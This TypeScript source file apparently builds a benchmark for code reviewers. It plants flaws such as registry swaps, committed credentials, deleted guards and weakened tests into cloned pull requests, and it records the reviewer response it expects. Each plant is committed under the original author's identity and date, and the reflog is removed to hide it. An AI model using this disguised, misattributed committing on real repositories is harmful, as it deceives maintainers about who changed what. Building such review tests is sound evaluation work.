      /\.(json|txt|ya?ml|out|expected)$/.test(p) &&
      !/(^|\/)(tsconfig|package|jsconfig|manifest)[^/]*\.json$/.test(p)),
  "public-surface-widened": (p) => /\.(ts|tsx|js)$/.test(p) && !JS_TEST.test(p),
};

/** One proposal for a host, problem and style, with where it aims to land. */
export interface Candidate {
  readonly host: Host;
  readonly problem: Problem;
  readonly style: string;
  readonly proposal: Proposal;
  readonly aimed: ReturnType<typeof aimedPosition>;
  readonly near: number;
}

const texts = new WeakMap<Host, Map<string, string | null>>();
const show = (host: Host, path: string) => {
  const cache = texts.get(host) ?? new Map<string, string | null>();
  texts.set(host, cache);
  if (!cache.has(path)) {
    const out = Bun.spawnSync([
      "git",
      "-C",
      host.replay,
      "show",
      `${host.record.firstRevision!.head}:${path}`,
    ]);
    cache.set(path, out.exitCode === 0 ? out.stdout.toString() : null);
  }
  return cache.get(path)!;
};

/** Every proposal a host offers for a problem and bucket, nearest files first, at most `limit` files read. */
export const candidatesFor = (
  host: Host,
  problem: Problem,
  bucket: Bucket,
  limit = 400,
): Array<Candidate> => {
  const style = STYLE[problem][bucket];
  // Rare material is found by its text first, so the nearest-files cut never hides it.
  const grep = (pattern: string, ...globs: ReadonlyArray<string>) =>
    new Set(
      gitRun(
        host.replay,
        [
          "grep",
          "-l",
          "-E",
          pattern,
          host.record.firstRevision!.head,
          "--",
          ...globs,
        ],
        true,
      )
        .stdout.split("\n")
        .filter(Boolean)
        .map((line) => line.slice(host.record.firstRevision!.head.length + 1)),
    );
  const generated =
    problem === "generated-hand-edit"
      ? grep("Code generated .* DO NOT EDIT|@generated", "*.go", "*.js", "*.ts")
      : problem === "import-swap"
        ? grep('"(crypto/rand|html/template)"', "*.go")
        : null;
  const siblings = (path: string) =>
    host.files.filter(
      (f) => posix.dirname(f) === posix.dirname(path) && /\.[jt]sx?$/.test(f),
    );
  const generator: Generator = {
    "lockfile-registry-swap": registrySwap,
    "lockfile-integrity-swap": integritySwap,
    "lockfile-new-dependency": newDependency,
    "test-weakened": testWeakened,
    "doc-misleads": docMisleads,
    "committed-credential": credential,
    "generated-hand-edit": generatedEdit,
    "import-swap": importSwap,
    "guard-deletion": guardDeletion,
    "fixture-hides-failure": fixtureHides,
    "public-surface-widened": publicSurface(siblings),
  }[problem];
  const paths = host.files
    .filter(PREDICATE[problem])
    .filter((p) => generated === null || generated.has(p))
    // Vendored trees are no reviewer's file.
    .filter((p) => !/(^|\/)(node_modules|vendor|third_party|\.repos)\//.test(p))
    .map((p) => ({ p, near: nearness(host, p) }))
    .sort((a, b) => b.near - a.near || a.p.localeCompare(b.p))
    .slice(0, limit);
  const out: Array<Candidate> = [];
  for (const { p, near } of paths) {
    const text = show(host, p);
    if (text === null || text.length > 2_000_000 || text.includes("\u0000"))
      continue;
    const proposal = generator(
      {
        path: p,
        text,
        seed: `${host.caseId}|${problem}|${bucket}|${p}`,
        inRange: host.rangeFiles.has(p),
      },
      style,
    );
    if (proposal === null || proposal.content === text) continue;
    const aimed = aimedPosition(
      host,
      p,
      firstChangedLine(text, proposal.content),
    );
    if (bucketOf(aimed.position) !== bucket) continue;
    out.push({ host, problem, style, proposal, aimed, near });
  }
  return out;
};

// Variants

export const PlantedRecord = z.strictObject({
  version: z.literal(1),
  caseId: z.string(),
  variant: z.int().min(1),
  host: z.strictObject({
    caseId: z.string(),
    source: z.string(),
    number: z.int(),
    base: z.string(),
    head: z.string(),
  }),
  problem: z.enum(PROBLEMS),
  kind: z.string(),
  style: z.string(),
  bucket: z.enum(BUCKETS),
  aimed: z.strictObject({
    rank: z.int(),
    units: z.int(),
    position: z.int(),
    order: z.literal("directory, path, line"),
  }),
  commit: z.string(),
  message: z.string(),
  description: z.string(),
  /** The plant's changed lines, as ranges and as the lanes measure's line keys. */
  lines: z.array(
    z.strictObject({
      path: z.string(),
      side: z.enum(["old", "new"]),
      startLine: z.int().min(1),
      endLine: z.int().min(1),
    }),
  ),
  lineKeys: z.array(z.string()),
  /** Words that name the plant, for "named in what was checked". */
  mentions: z.array(z.string()),
  expected: z.literal(
    "a request for changes citing the planted lines, or a person's lane (human-suggested or human-required) with the plant named in what was checked",
  ),
});
export type PlantedRecord = z.infer<typeof PlantedRecord>;

const lineKeysOf = (ranges: PlantedRecord["lines"]) =>
  ranges.flatMap((r) =>
    Array.from(
      { length: r.endLine - r.startLine + 1 },
      (_, i) => `${r.path}:${r.side}:${r.startLine + i}`,
    ),
  );

const toRanges = (
  changed: ReadonlyMap<string, ReadonlyArray<[number, number]>>,
  side: "old" | "new",
) =>
  [...changed].flatMap(([path, ranges]) =>
    ranges.map(([startLine, endLine]) => ({ path, side, startLine, endLine })),
  );

/**
 * Builds one variant: the host's clone copied locally (hardlinked), the plant committed on the host's
 * head by its author, the worktree moved to it without a reflog, the case record with its leakage
 * checks and the evaluator-only planted record. Refuses an existing folder, a plant whose own diff
 * breaks its light class, and a clone that fails a leakage check.
 */
export const buildVariant = (
  casesRoot: string,
  variant: number,
  chosen: Candidate,
) => {
  const { host, proposal } = chosen;
  const directory = join(casesRoot, "planted", String(variant));
  if (existsSync(directory))
    throw new Error(`${directory} exists; a variant is never rebuilt in place`);
  const first = host.record.firstRevision!;
  const replay = join(directory, "replay");
  mkdirSync(directory, { recursive: true });
  run([
    "git",
    "clone",
    "--quiet",
    "--local",
    "--no-tags",
    "--single-branch",
    "--branch",
    "replay",
    host.replay,
    replay,
  ]);
  gitRun(replay, ["remote", "remove", "origin"]);
  const author = gitRun(replay, [
    "log",
    "-1",
    "--format=%an%x00%ae%x00%ct",
    first.head,
  ])
    .stdout.trim()
    .split("\u0000");
  const headSeconds = Number(author[2]);
  const latest = Math.floor(new Date(first.at).getTime() / 1000) + 1_800;
  const date = new Date(
    Math.min(headSeconds + 600, latest) * 1000,
  ).toISOString();
  const commit = plantCommit(replay, {
    parent: first.head,
    edits: [{ path: proposal.path, content: proposal.content }],
    message: proposal.message,
    indexName: "plant",
    identity: { name: author[0]!, email: author[1]!, date },
  });
  gitRun(replay, ["read-tree", "-m", "-u", first.head, commit]);
  gitRun(replay, [
    "update-ref",
    "--no-deref",
    "refs/heads/replay",
    commit,
    first.head,
  ]);
  run(["rm", "-rf", join(replay, ".git", "logs")]);
  const kind =
    KIND_OF[chosen.problem] === "by-file"
      ? /\.(md|mdx)$/i.test(proposal.path)
        ? "light-docs"
        : FIXTURE.test(proposal.path)
          ? "light-fixtures"
          : "light-tests"
      : (KIND_OF[chosen.problem] as LightKind);
  const shape = lightShapeProblem(kind, plantFiles(replay, first.head, commit));
  const ranges = [
    ...toRanges(changedHeadLines(replay, first.head, commit), "new"),
    ...toRanges(changedBaseLines(replay, first.head, commit), "old").filter(
      () => kind === "light-deletion-only",
    ),
  ];
  const lineRule = checkKind(
    kind,
    changedHeadLines(replay, first.base, commit),
    ranges,
    changedBaseLines(replay, first.base, commit),
  );
  if (shape !== null || lineRule !== null) {
    run(["rm", "-rf", directory]);
    throw new Error(
      `variant ${variant} (${host.caseId}, ${chosen.problem}): ${shape ?? lineRule}`,
    );
  }
  const caseId = `planted:${chosen.problem}:${chosen.style.replace(/ /g, "-")}:${host.source}/${host.number}`;
  const record: Case = CaseRecord.parse({
    ...host.record,
    caseId,
    source: "planted",
    number: variant,
    title: proposal.message,
    selection: {
      score: 0,
      reasons: [`planted light-file variant of ${host.caseId} (NEU-148 set B)`],
    },
    firstRevision: { ...first, head: commit },
    // The host's head is the plant's parent, so it is in the clone by design; when the pull request
    // never moved after its first revision, the host's record names it as its final head too.
    later:
      host.record.later === null
        ? null
        : {
            finalHead:
              host.record.later.finalHead === first.head
                ? null
                : host.record.later.finalHead,
            merged:
              host.record.later.merged === first.head
                ? null
                : host.record.later.merged,
            revisions: host.record.later.revisions.filter(
              (sha) => sha !== first.head,
            ),
          },
    size: null,
    capture: { at: host.record.capture.at, files: [] },
    clone: { path: replay, preparedAt: new Date().toISOString() },
    checks: null,
    unavailable: null,
  });
  const checks = leakageChecks(record);
  if (!checks.passed) {
    run(["rm", "-rf", directory]);
    throw new Error(
      `variant ${variant}: leakage checks failed ${JSON.stringify(checks)}`,
    );
  }
  writeFileSync(
    join(directory, "case.json"),
    `${JSON.stringify(CaseRecord.parse({ ...record, checks }), null, 2)}\n`,
  );
  // Where the plant's unit falls among the variant's own units, as built.
  const units = unitsInOrder(
    proximityTarget(caseId, gitHunks(replay, `${first.base}..${commit}`)),
  );
  const keys = lineKeysOf(ranges);
  const target = proximityTarget(
    caseId,
    gitHunks(replay, `${first.base}..${commit}`),
  );
  const plantUnit = target.find((u) => keys.some((k) => u.lines.has(k)));
  const rank =
    plantUnit === undefined
      ? -1
      : units.findIndex((u) => u.unit === plantUnit.unit) + 1;
  const planted = PlantedRecord.parse({
    version: 1,
    caseId,
    variant,
    host: {
      caseId: host.caseId,
      source: host.source,
      number: host.number,
      base: first.base,
      head: first.head,
    },
    problem: chosen.problem,
    kind,
    style: chosen.style,
    bucket: bucketOf(((Math.max(rank, 1) - 1) % 16) + 1),
    aimed: {
      rank,
      units: units.length,
      position: ((Math.max(rank, 1) - 1) % 16) + 1,
      order: "directory, path, line",
    },
    commit,
    message: proposal.message,
    description: proposal.description,
    lines: ranges,
    lineKeys: keys,
    mentions: [...proposal.mentions],
    expected:
      "a request for changes citing the planted lines, or a person's lane (human-suggested or human-required) with the plant named in what was checked",
  });
  writeFileSync(
    join(directory, "planted.json"),
    `${JSON.stringify(planted, null, 2)}\n`,
  );
  return planted;
};

/**
 * Chooses one proposal per problem and bucket over the hosts, spreading the variants: the host with
 * the fewest so far that offers the bucket, the nearest file first. Problems no host can place in a
 * bucket are returned as shortfalls, never filled with another bucket.
 */
export const chooseVariants = (hosts: ReadonlyArray<Host>) => {
  const load = new Map(hosts.map((h) => [h.caseId, 0]));
  const chosen: Array<Candidate> = [];
  const shortfalls: Array<{ problem: Problem; bucket: Bucket }> = [];
  const used = (host: Host, problem: Problem) =>
    chosen.filter((c) => c.host === host && c.problem === problem).length;
  for (const problem of PROBLEMS)
    for (const bucket of BUCKETS) {
      const offers = hosts
        // A file already planted with this problem (another host of the same repository) is skipped.
        .map((host) => ({
          host,
          best: candidatesFor(host, problem, bucket, 120).find(
            (c) =>
              !chosen.some(
                (o) =>
                  o.problem === problem && o.proposal.path === c.proposal.path,
              ),
          ),
        }))
        .filter(
          (o): o is { host: Host; best: Candidate } => o.best !== undefined,
        )
        .sort(
          (a, b) =>
            used(a.host, problem) - used(b.host, problem) ||
            load.get(a.host.caseId)! - load.get(b.host.caseId)! ||
            b.best.near - a.best.near,
        );
      const offer = offers[0];
      if (offer === undefined) {
        shortfalls.push({ problem, bucket });
        continue;
      }
      load.set(offer.host.caseId, load.get(offer.host.caseId)! + 1);
      chosen.push(offer.best);
    }
  return { chosen, shortfalls };
};

/** Where set B's index is kept beside the lanes eval sets: every variant's record, pinned by hash. */
export const PLANTED_SET = join(FULL_TEST_RESULTS, "lanes", "planted-light");

/**
 * The hosts: the parity sample's cases (by the eval set's sources and numbers) whose own range has 16
 * or more of today's units, computed by code from the range.
 */
export const parityHosts = (
  casesRoot: string,
  set: {
    readonly cases: ReadonlyArray<{
      readonly caseId: string;
      readonly source: string;
      readonly number: number;
    }>;
  },
  sample: ReadonlySet<string>,
) =>
  set.cases
    .filter((c) => sample.has(c.caseId))
    .map((c) => readHost(casesRoot, `${c.source}/${c.number}`))
    .filter((host) => host.units.length >= 16);
